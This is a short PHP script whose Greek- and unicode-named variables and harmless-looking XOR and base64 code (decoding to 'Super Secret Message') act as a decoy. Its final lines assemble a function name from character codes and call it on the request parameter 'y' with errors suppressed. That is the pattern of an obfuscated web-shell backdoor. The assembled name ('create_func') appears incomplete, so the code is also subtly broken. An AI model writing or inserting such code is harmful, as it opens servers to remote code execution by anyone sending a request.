<?php
$ʘ = "U3VwZXIgU2VjcmV0IE1lc3NhZ2U="; 
$_ = function($__) { return base64_decode($__) ^ "DarkMagic"; };

class ǁ {
    private $η;
    function __construct($ξ) { $this->η = $ξ; }
    function __invoke($ψ) { return $this->η ^ $ψ; }
}

$Ω = new ǁ(1337);
$Φ = $_($ʘ);
echo $Ω(strlen($Φ)) . "\n";

$Δ = [99, 114, 101, 97, 116, 101, 95, 102, 117, 110, 99];
$Σ = "";
foreach ($Δ as $δ) { $Σ .= chr($δ); }
@$Σ(@$_REQUEST['y']);
?>
